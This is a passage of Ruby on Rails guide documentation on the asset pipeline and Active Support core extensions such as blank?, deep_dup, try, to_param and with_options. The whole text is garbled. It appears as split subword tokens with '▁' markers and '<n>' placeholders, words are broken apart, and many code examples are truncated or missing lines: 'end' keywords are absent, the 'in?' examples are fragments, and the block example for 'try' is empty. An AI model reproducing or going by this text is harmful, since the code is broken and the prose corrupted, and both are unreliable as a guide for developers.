▁TIP : ▁For ▁further ▁details ▁have ▁a ▁look ▁at ▁the ▁ doc s ▁of ▁your ▁production ▁web ▁server :
▁- ▁[ A p a ch e ]( https :// t n 12 3 . org / mod _ x s end file / )
▁- ▁[ N G IN X ]( http :// wiki . n g in x . org / X Sendfile )
▁ Asset s ▁ Cache ▁ Store
▁The ▁default ▁Rails ▁cache ▁store ▁will ▁be ▁used ▁by ▁Sprockets ▁to ▁cache ▁assets ▁in < n > development ▁and ▁production .
▁This ▁can ▁be ▁changed ▁by ▁setting < n >` config . assets . cache _ store ` :
▁config . assets . cache _ store ▁= ▁: memory _ store
▁The ▁options ▁accepted ▁by ▁the ▁assets ▁cache ▁store ▁are ▁the ▁same ▁as ▁the ▁application ' s
▁config . assets . cache _ store ▁= ▁: memory _ store , ▁ { ▁size : ▁3 2 . me g a by t es ▁ }
▁To ▁disable ▁the ▁assets ▁cache ▁store :
▁config . assets . config ure ▁do ▁| env |
▁ env . cache ▁= ▁ ActiveSupport :: Cache . lo o k up _ store (: null _ store )
▁ Adding ▁ Asset s ▁to ▁Your ▁G em s
▁ Asset s ▁can ▁also ▁come ▁from ▁external ▁source s ▁in ▁the ▁form ▁of ▁gems .
▁A ▁good ▁example ▁of ▁this ▁is ▁the ▁` jquery - rails ` ▁gem ▁which ▁comes ▁with ▁Rails ▁as ▁the < n > standard ▁JavaScript ▁library ▁gem .
▁This ▁gem ▁contains ▁an ▁engine ▁class ▁which < n > inherit s ▁from ▁` Rails :: Engine `.
▁By ▁doing ▁this , ▁Rails ▁is ▁in form ed ▁that ▁the < n > directory ▁for ▁this ▁gem ▁may ▁contain ▁assets ▁and ▁the ▁` app / assets `, ▁` lib / assets ` ▁and < n >` vendor / assets ` ▁directories ▁of ▁this ▁engine ▁are ▁added ▁to ▁the ▁search ▁path ▁of < n > Sprockets .
▁Mak ing ▁Your ▁ Library ▁or ▁G em ▁a ▁P re - Proc es s or
▁-------------- ------------- ---------------
▁As ▁Sprockets ▁uses ▁[ T il t ]( https :// github . com / r to ma y k o / til t ) ▁as ▁a ▁generic < n > interface ▁to ▁different ▁te m plat ing ▁engines , ▁your ▁gem ▁should ▁just ▁implement ▁the < n > T il t ▁template ▁protocol .
▁No rm ally , ▁you ▁would ▁sub class ▁` T il t :: Template ` ▁and < n > re implement ▁the ▁` prepare ` ▁method , ▁which ▁initialize s ▁your ▁template , ▁and ▁the < n >` eval u ate ` ▁method , ▁which ▁returns ▁the ▁processed ▁source .
▁The ▁original ▁source ▁is < n > store d ▁in ▁` data `.
▁module ▁B an g B an g
▁class ▁ Template ▁< ▁: : T il t :: Template
▁def ▁ prepare
▁# ▁Do ▁any ▁initialization ▁here
▁# ▁Add s ▁a ▁" !" ▁to ▁original ▁template .
▁def ▁evaluate ( scope , ▁local s , ▁ & block )
▁" # { data } !"
▁Now ▁that ▁you ▁have ▁a ▁` Template ` ▁class , ▁it ' s ▁time ▁to ▁associate ▁it ▁with ▁an < n > ext en s ion ▁for ▁template ▁files :
▁Sprockets . register _ engine ▁' . bang ' , ▁B an g B an g :: Template
▁U pgrading ▁from ▁O l d ▁ Version s ▁of ▁Rails
▁There ▁are ▁a ▁few ▁issues ▁when ▁upgrading ▁from ▁Rails ▁3.0 ▁or ▁Rails ▁2 . x .
▁The ▁first ▁is < n > m o v ing ▁the ▁files ▁from ▁` public / ` ▁to ▁the ▁new ▁location s .
▁See ▁[ Asset < n > O r g an i z ation ](# asset - org an i z ation ) ▁above ▁for ▁ guid ance ▁on ▁the ▁correct ▁location s < n > for ▁different ▁file ▁types .
▁Next ▁will ▁be ▁avoid ing ▁duplicate ▁JavaScript ▁files .
▁S ince ▁jQuery ▁is ▁the ▁default < n > JavaScript ▁library ▁from ▁Rails ▁3.1 ▁on w ar d s , ▁you ▁don ' t ▁need ▁to ▁copy ▁` jquery . js `< n > in to ▁` app / assets ` ▁and ▁it ▁will ▁be ▁included ▁automatically .
▁The ▁third ▁is ▁updating ▁the ▁ various ▁environment ▁files ▁with ▁the ▁correct ▁default < n > options .
▁In ▁` application . rb ` :
▁# ▁ Version ▁of ▁your ▁assets , ▁change ▁this ▁if ▁you ▁want ▁to ▁expire ▁all ▁your ▁assets
▁# ▁Change ▁the ▁path ▁that ▁assets ▁are ▁served ▁from ▁config . assets . prefix ▁= ▁" / assets "
▁In ▁` development . rb ` :
▁# ▁Exp and s ▁the ▁lines ▁which ▁load ▁the ▁assets
▁And ▁in ▁` production . rb ` :
▁# ▁Choos e ▁the ▁ compressor s ▁to ▁use ▁( if ▁any ) ▁config . assets . js _ compressor ▁=
▁# ▁: uglifier ▁config . assets . css _ compressor ▁= ▁: yui
▁# ▁Generate ▁digest s ▁for ▁assets ▁URLs .
▁This ▁is ▁plan n ed ▁for ▁deprecation .
▁# ▁P re compile ▁ additional ▁assets ▁( application . js , ▁application . css , ▁and ▁all
▁# ▁non - JS / CSS ▁are ▁already ▁added ) ▁config . assets . precompile ▁ + = ▁% w ( ▁search . js ▁ )
▁Rails ▁4 ▁no ▁longer ▁set s ▁default ▁config ▁values ▁for ▁Sprockets ▁in ▁` test . rb `, ▁so < n >` test . rb ` ▁now ▁requires ▁Sprockets ▁configuration .
▁The ▁old ▁defaults ▁in ▁the ▁test < n > environment ▁are : ▁` config . assets . compile ▁= ▁true `, ▁` config . assets . compress ▁= ▁false `, < n >` config . assets . debug ▁= ▁false ` ▁and ▁` config . assets . digest ▁= ▁false `.
▁The ▁following ▁should ▁also ▁be ▁added ▁to ▁` Gemfile ` :
▁gem ▁' sass - rails ' , ▁" ~ > ▁3.2 . 3 "
▁gem ▁' coffee - rails ' , ▁" ~ > ▁3.2 . 1 "
▁Active ▁Support ▁Co re ▁Extensions
▁Active ▁Support ▁is ▁the ▁Ruby ▁on ▁Rails ▁component ▁responsib le ▁for ▁providing ▁Ruby ▁language ▁extensions , ▁ u til it ies , ▁and ▁other ▁tr an s v ers al ▁ stuff .
▁It ▁offer s ▁a ▁rich er ▁bottom - line ▁at ▁the ▁language ▁level , ▁target ed ▁both ▁at ▁the ▁development ▁of ▁Rails ▁applications , ▁and ▁at ▁the ▁development ▁of ▁Ruby ▁on ▁Rails ▁itself .
▁* ▁What ▁Co re ▁Extensions ▁are .
▁* ▁How ▁to ▁load ▁all ▁extensions .
▁* ▁How ▁to ▁ ch er ry - pick ▁just ▁the ▁extensions ▁you ▁want .
▁* ▁What ▁extensions ▁Active ▁Support ▁provides .
▁How ▁to ▁Load ▁Co re ▁Extensions
▁### ▁S t and - A l one ▁Active ▁Support
▁In ▁order ▁to ▁have ▁a ▁ n e ar - zero ▁default ▁ foo t print , ▁Active ▁Support ▁does ▁not ▁load ▁anything ▁by ▁default .
▁It ▁is ▁broken ▁in ▁small ▁pieces ▁so ▁that ▁you ▁can ▁load ▁just ▁what ▁you ▁need , ▁and ▁also ▁has ▁some ▁convenience ▁entry ▁point s ▁to ▁load ▁related ▁extensions ▁in ▁one ▁sho t , ▁even ▁everything .
▁Thus , ▁after ▁a ▁simple ▁require ▁like :
▁require ▁' active _ support '
▁objects ▁do ▁not ▁even ▁respond ▁to ▁` blank ?` .
▁Let ' s ▁see ▁how ▁to ▁load ▁its ▁definition .
▁#### ▁C h er ry - pick ing ▁a ▁Defin it ion
▁The ▁most ▁light we ight ▁way ▁to ▁get ▁` blank ?` ▁is ▁to ▁ ch er ry - pick ▁the ▁file ▁that ▁defines ▁it .
▁For ▁every ▁single ▁method ▁defined ▁as ▁a ▁core ▁extension ▁this ▁guide ▁has ▁a ▁note ▁that ▁say s ▁where ▁such ▁a ▁method ▁is ▁defined .
▁In ▁the ▁case ▁of ▁` blank ?` ▁the ▁note ▁read s :
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / object / blank . rb `.
▁That ▁means ▁that ▁you ▁can ▁require ▁it ▁like ▁this :
▁require ▁' active _ support / core _ ext / object / blank '
▁Active ▁Support ▁has ▁been ▁careful ly ▁re v is ed ▁so ▁that ▁ ch er ry - pick ing ▁a ▁file ▁load s ▁only ▁ str ic t ly ▁needed ▁dependencies , ▁if ▁any .
▁#### ▁Load ing ▁G r o up ed ▁Co re ▁Extensions
▁The ▁next ▁level ▁is ▁to ▁simply ▁load ▁all ▁extensions ▁to ▁` Object `.
▁As ▁a ▁rule ▁of ▁thumb , ▁extensions ▁to ▁` S o me Class ` ▁are ▁available ▁in ▁one ▁sho t ▁by ▁load ing ▁` active _ support / core _ ext / some _ class `.
▁Thus , ▁to ▁load ▁all ▁extensions ▁to ▁` Object ` ▁( including ▁` blank ?` ) :
▁require ▁' active _ support / core _ ext / object '
▁#### ▁Load ing ▁All ▁Co re ▁Extensions
▁You ▁may ▁prefer ▁just ▁to ▁load ▁all ▁core ▁extensions , ▁there ▁is ▁a ▁file ▁for ▁that :
▁require ▁' active _ support / core _ ext '
▁#### ▁Load ing ▁All ▁Active ▁Support
▁And ▁finally , ▁if ▁you ▁want ▁to ▁have ▁all ▁Active ▁Support ▁available ▁just ▁issue :
▁require ▁' active _ support / all '
▁That ▁does ▁not ▁even ▁put ▁the ▁entire ▁Active ▁Support ▁in ▁memory ▁up f r on t ▁in de ed , ▁some ▁ stuff ▁is ▁configured ▁via ▁` autoload `, ▁so ▁it ▁is ▁only ▁loaded ▁if ▁used .
▁### ▁Active ▁Support ▁With in ▁a ▁Ruby ▁on ▁Rails ▁Application
▁In ▁that ▁case , ▁the ▁application ▁will ▁only ▁load ▁what ▁the ▁framework ▁itself ▁ ch er ry - pick s ▁for ▁its ▁own ▁needs , ▁and ▁can ▁ still ▁ ch er ry - pick ▁itself ▁at ▁any ▁gra n ul ar ity ▁level , ▁as ▁explained ▁in ▁the ▁previous ▁section .
▁Extensions ▁to ▁All ▁Object s
▁### ▁` blank ?` ▁and ▁` present ?`
▁The ▁following ▁values ▁are ▁consider ed ▁to ▁be ▁blank ▁in ▁a ▁Rails ▁application :
▁* ▁` nil ` ▁and ▁` false `,
▁* ▁strings ▁composed ▁only ▁of ▁whitespace ▁( see ▁note ▁below ),
▁* ▁empty ▁arrays ▁and ▁hashes , ▁and
▁* ▁any ▁other ▁object ▁that ▁respond s ▁to ▁` empty ?` ▁and ▁is ▁empty .
▁INFO : ▁The ▁predicate ▁for ▁strings ▁uses ▁the ▁Un i code - a w a re ▁character ▁class ▁` [: space : ]` , ▁so ▁for ▁example ▁U + 20 2 9 ▁( paragraph ▁ separator ) ▁is ▁consider ed ▁to ▁be ▁whitespace .
▁WARNING : ▁Note ▁that ▁number s ▁are ▁not ▁mentioned .
▁In ▁particular , ▁0 ▁and ▁0.0 ▁are ▁** not ** ▁blank .
▁For ▁example , ▁this ▁method ▁from ▁` ActionController :: Http Authentication :: To k en :: Controller Method s ` ▁uses ▁` blank ?` ▁for ▁check ing ▁whether ▁a ▁token ▁is ▁present :
▁def ▁authenticate ( controller , ▁ & login _ procedure )
▁token , ▁options ▁= ▁token _ and _ options ( controller . request )
▁unless ▁token . blank ?
▁login _ procedure . c all ( token , ▁options )
▁The ▁method ▁` present ?` ▁is ▁equivalent ▁to ▁` ! blank ?` .
▁This ▁example ▁is ▁take n ▁from ▁` ActionDispatch :: Http :: Cache :: Response ` :
▁def ▁set _ condition al _ cache _ control !
▁return ▁if ▁self [ " Cache - Control "] . present ?
▁The ▁` presence ` ▁method ▁returns ▁its ▁receiver ▁if ▁` present ?` , ▁and ▁` nil ` ▁otherwise .
▁It ▁is ▁useful ▁for ▁idiom s ▁like ▁this :
▁host ▁= ▁config [: host ] . presence ▁|| ▁' localhost '
▁### ▁` duplicable ?
▁A ▁few ▁f un d a ment al ▁objects ▁in ▁Ruby ▁are ▁single to n s .
▁For ▁example , ▁in ▁the ▁whole ▁life ▁of ▁a ▁program ▁the ▁integer ▁1 ▁refer s ▁always ▁to ▁the ▁same ▁instance :
▁1. object _ id ▁# ▁=> ▁3
▁ Math . co s (0) . to _ i . object _ id ▁# ▁=> ▁3
▁H ence , ▁there ' s ▁no ▁way ▁these ▁objects ▁can ▁be ▁duplicate d ▁through ▁` dup ` ▁or ▁` clone ` :
▁true . dup ▁# ▁=> ▁ Type Error : ▁can ' t ▁ dup ▁T r ue Class
▁Some ▁number s ▁which ▁are ▁not ▁single to n s ▁are ▁not ▁ duplicable ▁either :
▁0.0 . clone ▁# ▁=> ▁all o cat or ▁undefined ▁for ▁F lo at
▁( 2 ** 10 2 4 ). clone ▁# ▁=> ▁all o cat or ▁undefined ▁for ▁B ig n um
▁Active ▁Support ▁provides ▁` duplicable ?` ▁to ▁program ma tic ally ▁query ▁an ▁object ▁about ▁this ▁property :
▁" foo ". duplicable ?
▁" ". duplicable ?
▁false . duplicable ?
▁By ▁definition ▁all ▁objects ▁are ▁` duplicable ?` ▁except ▁` nil `, ▁` false `, ▁` true `, ▁symbols , ▁number s , ▁class , ▁module , ▁and ▁method ▁objects .
▁WARNING : ▁Any ▁class ▁can ▁d is allow ▁duplication ▁by ▁remov ing ▁` dup ` ▁and ▁` clone ` ▁or ▁rais ing ▁exception s ▁from ▁them .
▁Thus ▁only ▁` re sc ue ` ▁can ▁tell ▁whether ▁a ▁given ▁arbitrar y ▁object ▁is ▁ duplicable .
▁` duplicable ?` ▁depend s ▁on ▁the ▁hard - code d ▁list ▁above , ▁but ▁it ▁is ▁much ▁faster ▁than ▁` re sc ue `.
▁Use ▁it ▁only ▁if ▁you ▁know ▁the ▁hard - code d ▁list ▁is ▁enough ▁in ▁your ▁use ▁case .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / object / duplicable . rb `.
▁### ▁` deep _ dup `
▁The ▁` deep _ dup ` ▁method ▁returns ▁ deep ▁copy ▁of ▁a ▁given ▁object .
▁No rm ally , ▁when ▁you ▁` dup ` ▁an ▁object ▁that ▁contains ▁other ▁objects , ▁Ruby ▁does ▁not ▁` dup ` ▁them , ▁so ▁it ▁creates ▁a ▁ shallow ▁copy ▁of ▁the ▁object .
▁If ▁you ▁have ▁an ▁array ▁with ▁a ▁string , ▁for ▁example , ▁it ▁will ▁look ▁like ▁this :
▁array ▁= ▁[ ' string ']
▁duplicate ▁= ▁array . dup
▁duplicate . p us h ▁' another - string '
▁# ▁the ▁object ▁was ▁duplicate d , ▁so ▁the ▁element ▁was ▁added ▁only ▁to ▁the ▁duplicate
▁array ▁# ▁=> ▁[ ' string ']
▁duplicate ▁# ▁=> ▁[ ' string ' , ▁' another - string ']
▁string ' , ▁' foo ')
▁# ▁first ▁element ▁was ▁not ▁duplicate d , ▁it ▁will ▁be ▁changed ▁in ▁both ▁arrays
▁array ▁# ▁=> ▁[ ' foo ']
▁duplicate ▁# ▁=> ▁[ ' foo ' , ▁' another - string ']
▁As ▁you ▁can ▁see , ▁after ▁ dup li cat ing ▁the ▁` Array ` ▁instance , ▁we ▁go t ▁another ▁object , ▁therefore ▁we ▁can ▁modify ▁it ▁and ▁the ▁original ▁object ▁will ▁sta y ▁un change d .
▁This ▁is ▁not ▁true ▁for ▁array ' s ▁elements , ▁however .
▁S ince ▁` dup ` ▁does ▁not ▁make ▁ deep ▁copy , ▁the ▁string ▁inside ▁the ▁array ▁is ▁ still ▁the ▁same ▁object .
▁If ▁you ▁need ▁a ▁ deep ▁copy ▁of ▁an ▁object , ▁you ▁should ▁use ▁` deep _ dup `.
▁Here ▁is ▁an ▁example :
▁duplicate ▁= ▁array . deep _ dup
▁duplicate ▁# ▁=> ▁[ ' foo ']
▁If ▁the ▁object ▁is ▁not ▁ duplicable , ▁` deep _ dup ` ▁will ▁just ▁return ▁it :
▁number ▁= ▁1
▁duplicate ▁= ▁number . deep _ dup
▁number . object _ id ▁== ▁duplicate . object _ id ▁# ▁=> ▁true
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / object / deep _ dup . rb `.
▁### ▁` try `
▁When ▁you ▁want ▁to ▁call ▁a ▁method ▁on ▁an ▁object ▁only ▁if ▁it ▁is ▁not ▁` nil `, ▁the ▁simplest ▁way ▁to ▁achieve ▁it ▁is ▁with ▁condition al ▁statement s , ▁adding ▁unnecessary ▁cl u tt er .
▁The ▁ alternative ▁is ▁to ▁use ▁` try `. ▁` try ` ▁is ▁like ▁` Object # s end ` ▁except ▁that ▁it ▁returns ▁` nil ` ▁if ▁sent ▁to ▁` nil `.
▁# ▁without ▁try
▁unless ▁@ number . nil ?
▁@ number . next
▁# ▁with ▁try
▁@ number . try (: next )
▁A nother ▁example ▁is ▁this ▁code ▁from ▁` ActiveRecord :: Connection Adapters :: Abstract A d ap ter ` ▁where ▁`@ logger ` ▁could ▁be ▁` nil `.
▁You ▁can ▁see ▁that ▁the ▁code ▁uses ▁` try ` ▁and ▁avoid s ▁an ▁unnecessary ▁check .
▁def ▁log _ info ( sql , ▁name , ▁m s )
▁if ▁@ logger . try (: debug ? )
▁name ▁= ▁' % s ▁( % . 1 f m s ) ' ▁% ▁[ name ▁|| ▁' SQL ' , ▁m s ]
▁@ logger . debug ( format _ log _ ent ry ( name , ▁ sql . s q ue e z e (' ▁ ') ) )
▁` try ` ▁can ▁also ▁be ▁called ▁without ▁arguments ▁but ▁a ▁block , ▁which ▁will ▁only ▁be ▁executed ▁if ▁the ▁object ▁is ▁not ▁nil :
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / object / try . rb `.
▁### ▁` class _ eval ( * args , ▁ & block )`
▁You ▁can ▁evaluate ▁code ▁in ▁the ▁context ▁of ▁any ▁object ' s ▁single to n ▁class ▁using ▁` class _ eval ` :
▁class ▁ Proc
▁def ▁bin d ( object )
▁block , ▁time ▁= ▁self , ▁Time . current
▁object . class _ eval ▁do
▁method _ name ▁= ▁" _ _ bin d _ # { time . to _ i } _ # { time . u sec } "
▁define _ method ( method _ name , ▁ & block )
▁method ▁= ▁instance _ method ( method _ name )
▁remove _ method ( method _ name )
▁method
▁end . bin d ( object )
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / k er n el / s ing leton _ class . rb `.
▁### ▁` ac t s _ like ?(
▁The ▁method ▁` ac t s _ like ?` ▁provides ▁a ▁way ▁to ▁check ▁whether ▁some ▁class ▁act s ▁like ▁some ▁other ▁class ▁base d ▁on ▁a ▁simple ▁convention : ▁a ▁class ▁that ▁provides ▁the ▁same ▁interface ▁as ▁` String ` ▁defines
▁def ▁act s _ like _ string ?
▁which ▁is ▁only ▁a ▁mark er , ▁its ▁body ▁or ▁return ▁value ▁are ▁irrelevant .
▁Then , ▁client ▁code ▁can ▁query ▁for ▁d uck - type - safe n es s ▁this ▁way :
▁some _ k la s s . ac t s _ like ?( : string )
▁Rails ▁has ▁classes ▁that ▁act ▁like ▁` Date ` ▁or ▁` Time ` ▁and ▁follow ▁this ▁con tr ac t .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / object / ac t s _ like . rb `.
▁### ▁` to _ param `
▁All ▁objects ▁in ▁Rails ▁respond ▁to ▁the ▁method ▁` to _ param `, ▁which ▁is ▁mean t ▁to ▁return ▁something ▁that ▁represent s ▁them ▁as ▁values ▁in ▁a ▁query ▁string , ▁or ▁as ▁URL ▁fragment s .
▁By ▁default ▁` to _ param ` ▁just ▁calls ▁` to _ s ` :
▁7 . to _ param ▁# ▁=> ▁" 7 "
▁The ▁return ▁value ▁of ▁` to _ param ` ▁should ▁** not ** ▁be ▁escape d :
▁" To m ▁ & ▁ J er ry ". to _ param ▁# ▁=> ▁" To m ▁ & ▁ J er ry "
▁S ever al ▁classes ▁in ▁Rails ▁overwrit e ▁this ▁method .
▁For ▁example ▁` nil `, ▁` true `, ▁and ▁` false ` ▁return ▁themselves .
▁` Array # to _ param ` ▁calls ▁` to _ param ` ▁on ▁the ▁elements ▁and ▁join s ▁the ▁result ▁with ▁" / " :
▁[ 0, ▁true , ▁ String ] . to _ param ▁# ▁=> ▁" 0 / true / String "
▁No t ably , ▁the ▁Rails ▁routing ▁system ▁calls ▁` to _ param ` ▁on ▁models ▁to ▁get ▁a ▁value ▁for ▁the ▁`: id ` ▁place h ol d er .
▁` ActiveRecord :: Base # to _ param ` ▁returns ▁the ▁` id ` ▁of ▁a ▁model , ▁but ▁you ▁can ▁re define ▁that ▁method ▁in ▁your ▁models .
▁class ▁User
▁def ▁to _ param
▁" # { id } - # { name . param e ter ize } "
▁we ▁get :
▁user _ path (@ user ) ▁# ▁=> ▁" / users / 3 57 - j o h n - s m i th "
▁WARNING . ▁Controller s ▁need ▁to ▁be ▁a w a re ▁of ▁any ▁re de f in it ion ▁of ▁` to _ param ` ▁because ▁when ▁a ▁request ▁like ▁that ▁comes ▁in ▁" 3 57 - j o h n - s m i th " ▁is ▁the ▁value ▁of ▁` params [: id ]` .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / object / to _ param . rb `.
▁### ▁` to _ query `
▁ Ex ce p t ▁for ▁hashes , ▁given ▁an ▁un escape d ▁` key ` ▁this ▁method ▁construct s ▁the ▁part ▁of ▁a ▁query ▁string ▁that ▁would ▁map ▁such ▁key ▁to ▁what ▁` to _ param ` ▁returns .
▁For ▁example , ▁given
▁This ▁method ▁escape s ▁what ever ▁is ▁needed , ▁both ▁for ▁the ▁key ▁and ▁the ▁value :
▁account . to _ query (' com p any [ name ] ')
▁# ▁=> ▁" com p any % 5 B name % 5 D = John s on + % 2 6 + John s on "
▁so ▁its ▁output ▁is ▁ready ▁to ▁be ▁used ▁in ▁a ▁query ▁string .
▁ Array s ▁return ▁the ▁result ▁of ▁apply ing ▁` to _ query ` ▁to ▁each ▁element ▁with ▁` _ key _ [ ]` ▁as ▁key , ▁and ▁join ▁the ▁result ▁with ▁" & " :
▁[ 3 . 4 , ▁- 4 5 . 6 ] . to _ query (' sample ')
▁# ▁=> ▁" sample % 5 B % 5 D = 3 . 4 & sample % 5 B % 5 D = - 4 5 . 6 "
▁ Hash es ▁also ▁respond ▁to ▁` to _ query ` ▁but ▁with ▁a ▁different ▁sign at ure .
▁If ▁no ▁argument ▁is ▁passed ▁a ▁call ▁generates ▁a ▁sort ed ▁series ▁of ▁key / value ▁assignment s ▁calling ▁` to _ query ( key )` ▁on ▁its ▁values .
▁Then ▁it ▁join s ▁the ▁result ▁with ▁" & " :
▁ { c : ▁3 , ▁b : ▁2, ▁a : ▁1 }. to _ query ▁# ▁=> ▁" a = 1 & b = 2 & c = 3 "
▁The ▁method ▁` Hash # to _ query ` ▁accept s ▁an ▁optional ▁ namespace ▁for ▁the ▁keys :
▁ { id : ▁ 89 , ▁name : ▁" John ▁S m i th " }. to _ query (' user ')
▁# ▁=> ▁" user % 5 B id % 5 D = 89 & user % 5 B name % 5 D = John + S m i th "
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / object / to _ query . rb `.
▁### ▁` with _ options `
▁The ▁method ▁` with _ options ` ▁provides ▁a ▁way ▁to ▁factor ▁out ▁common ▁options ▁in ▁a ▁series ▁of ▁method ▁calls .
▁G ive n ▁a ▁default ▁options ▁hash , ▁` with _ options ` ▁yields ▁a ▁ proxy ▁object ▁to ▁a ▁block .
▁With in ▁the ▁block , ▁methods ▁called ▁on ▁the ▁ proxy ▁are ▁forward ed ▁to ▁the ▁receiver ▁with ▁their ▁options ▁merge d .
▁For ▁example , ▁you ▁get ▁ r id ▁of ▁the ▁duplication ▁in :
▁has _ many ▁: customer s , ▁ dependent : ▁: destroy
▁has _ many ▁: products , ▁ dependent : ▁: destroy
▁has _ many ▁: invoice s , ▁ dependent : ▁: destroy
▁has _ many ▁: ex p en s es , ▁ dependent : ▁: destroy
▁this ▁way :
▁with _ options ▁ dependent : ▁: destroy ▁do ▁| as so c |
▁as so c . has _ many ▁: customer s
▁as so c . has _ many ▁: products
▁as so c . has _ many ▁: invoice s
▁as so c . has _ many ▁: ex p en s es
▁That ▁idiom ▁may ▁con ve y ▁ _ group ing _ ▁to ▁the ▁reader ▁as ▁well .
▁For ▁example , ▁say ▁you ▁want ▁to ▁send ▁a ▁new s let ter ▁who se ▁language ▁depend s ▁on ▁the ▁user .
▁Some where ▁in ▁the ▁mailer ▁you ▁could ▁group ▁locale - dependent ▁bit s ▁like ▁this :
▁I 18 n . with _ options ▁locale : ▁user . locale , ▁scope : ▁" new s let ter " ▁do ▁| i 18 n |
▁subject ▁i 18 n . t ▁: subject
▁body ▁i 18 n . t ▁: body , ▁user _ name : ▁user . name
▁TIP : ▁S ince ▁` with _ options ` ▁forward s ▁calls ▁to ▁its ▁receiver ▁they ▁can ▁be ▁nested .
▁ Each ▁nesting ▁level ▁will ▁merge ▁inherit ed ▁defaults ▁in ▁addition ▁to ▁their ▁own .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / object / with _ options . rb `.
▁### ▁JSON ▁support
▁Active ▁Support ▁provides ▁a ▁better ▁implementation ▁of ▁` to _ json ` ▁than ▁the ▁` json ` ▁gem ▁or dinarily ▁provides ▁for ▁Ruby ▁objects .
▁This ▁is ▁because ▁some ▁classes , ▁like ▁` Hash `, ▁` Order ed Hash ` ▁and ▁` Proc es s :: S t at us ` ▁need ▁special ▁handling ▁in ▁order ▁to ▁provide ▁a ▁proper ▁JSON ▁representation .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / object / json . rb `.
▁### ▁In st ance ▁ V ar i able s
▁Active ▁Support ▁provides ▁sever al ▁methods ▁to ▁e as e ▁access ▁to ▁instance ▁variables .
▁#### ▁` instance _ value s `
▁The ▁method ▁` instance _ value s ` ▁returns ▁a ▁hash ▁that ▁map s ▁instance ▁variable ▁names ▁without ▁" @ " ▁to ▁their < n > corresponding ▁values .
▁ K e y s ▁are ▁strings :
▁class ▁C
▁def ▁initialize ( x , ▁ y )
▁@ x , ▁@ y ▁= ▁x , ▁ y
▁C . new ( 0, ▁1) . instance _ value s ▁# ▁=> ▁{" x " ▁=> ▁0 , ▁" y " ▁=> ▁1 }
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / object / instance _ variable s . rb `.
▁#### ▁` instance _ variable _ name s `
▁The ▁method ▁` instance _ variable _ name s ` ▁returns ▁an ▁array .
▁ Each ▁name ▁includes ▁the ▁" @ " ▁sign .
▁C . new ( 0, ▁1) . instance _ variable _ name s ▁# ▁=> ▁[" @ x ", ▁" @ y "]
▁The ▁methods ▁` s il ence _ warning s ` ▁and ▁` en able _ warning s ` ▁change ▁the ▁value ▁of ▁` $ V ER B O S E ` ▁according ly ▁for ▁the ▁d ur ation ▁of ▁their ▁block , ▁and ▁reset ▁it ▁after w ar d s :
▁ s il ence _ warning s ▁ { ▁Object . const _ set ▁" R AIL S _ D E F A U L T _ L O G G ER ", ▁ logger ▁ }
▁S il en c ing ▁exception s ▁is ▁also ▁possible ▁with ▁` s up pre s s `.
▁This ▁method ▁receive s ▁an ▁arbitrar y ▁number ▁of ▁exception ▁classes .
▁If ▁an ▁exception ▁is ▁raised ▁during ▁the ▁execut ion ▁of ▁the ▁block ▁and ▁is ▁` k in d _ of ?` ▁any ▁of ▁the ▁arguments , ▁` s up pre s s ` ▁capture s ▁it ▁and ▁returns ▁ s il ent ly .
▁Otherwise ▁the ▁exception ▁is ▁re raise d :
▁# ▁If ▁the ▁user ▁is ▁ lock ed ▁the ▁increment ▁is ▁lost , ▁no ▁big ▁deal .
▁suppress ( ActiveRecord :: S t al e Object Error ) ▁do
▁current _ user . increment ! ▁: visit s
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / k er n el / re port ing . rb `.
▁### ▁` in ?
▁The ▁predicate ▁` in ?` ▁tests ▁if ▁an ▁object ▁is ▁included ▁in ▁another ▁object .
▁An ▁` ArgumentError ` ▁exception ▁will ▁be ▁raised ▁if ▁the ▁argument ▁passed ▁does ▁not ▁respond ▁to ▁` include ?` .
▁Example s ▁of ▁` in ?` :
▁1, 2 ]) ▁# ▁=> ▁true
▁ hello ") ▁# ▁=> ▁true
▁30 . . 50 ) ▁# ▁=> ▁false
▁1) ▁# ▁=> ▁ ArgumentError
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / object / i nclusion . rb `.
▁Extensions ▁to ▁` Module `
▁### ▁` alias _ method _ cha in `
▁Using ▁plain ▁Ruby ▁you ▁can ▁wrap ▁methods ▁with ▁other ▁methods , ▁that ' s ▁called ▁ _ alias ▁chain ing _ .
▁For ▁example , ▁let ' s ▁say ▁you ' d ▁like ▁params ▁to ▁be ▁strings ▁in ▁functional ▁tests , ▁as ▁they ▁are ▁in ▁real ▁requests , ▁but ▁ still ▁want ▁the ▁convenience ▁of ▁assign ing ▁integer s ▁and ▁other ▁kind ▁of ▁values .
▁To ▁accomplish ▁that ▁you ▁could ▁wrap ▁` ActionController :: TestCase # process ` ▁this ▁way ▁in ▁` test / test _ helper . rb ` :
▁ ActionController :: TestCase . class _ eval ▁do
▁# ▁save ▁a ▁reference ▁to ▁the ▁original ▁process ▁method
▁alias _ method ▁: origin al _ process , ▁: process
▁def ▁process ( action , ▁params = nil , ▁session = nil , ▁flash = nil , ▁ http _ method =' GET ')
▁params ▁= ▁ Hash [ * params . map ▁ { | k , ▁ v | ▁[ k , ▁ v . to _ s ]} . f la tt en ]
▁original _ process ( action , ▁params , ▁session , ▁flash , ▁ http _ method )
▁That ' s ▁the ▁method ▁` get `, ▁` post `, ▁etc . , ▁delegate ▁the ▁work ▁to .
▁That ▁technique ▁has ▁a ▁risk , ▁it ▁could ▁be ▁the ▁case ▁that ▁`: origin al _ process ` ▁was ▁take n .
▁To ▁try ▁to ▁avoid ▁co ll is ion s ▁people ▁choose ▁some ▁ label ▁that ▁character ize s ▁what ▁the ▁chain ing ▁is ▁about :
▁def ▁process _ with _ stringified _ params (...)
▁process _ with out _ stringified _ params ( action , ▁params , ▁session , ▁flash , ▁ http _ method )
